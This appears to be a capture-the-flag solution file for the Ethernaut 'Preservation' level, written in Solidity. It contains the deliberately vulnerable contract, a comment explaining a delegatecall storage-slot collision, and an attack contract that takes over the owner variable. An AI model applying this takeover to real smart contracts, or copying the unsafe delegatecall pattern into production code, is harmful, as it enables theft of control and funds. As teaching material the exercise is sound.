// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
  
   /*
   Let me explain this one, it's a complicated one.
   Delegate.call is a low call that potentially updates the CALLER contract with the logic of the contract BEING CALLED.
   The contract being called doesn't reference the state variables by their NAME. It references them BY THEIR STORAGE SLOT.
   
   Using that information we can:
   
   1. First step: Call setFirstTime inside Preservation and INPUT OUR ATTACK CONTRACT.
   -> This will lead to slot 0 inside Preservation being updated to our attack contract.
   Now we are able to call the logic inside our attack contract, re redirected the call from preservation "setFirstTime" to our contract by updating
   "address public timeZone1Library" to our attack contract.
   
   2. Second step: Call setFirstTime again inside Preservation and INPUT OUR ADDRESS.
   -> Now we will update slot 2 (owner variable) inside the preservation contract to our address
   
   */
  
  
contract attackLibrary {
    
    
    // random variables to fill up the first 2 slots inside the storage.
    address public one;
    address public two;

     // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
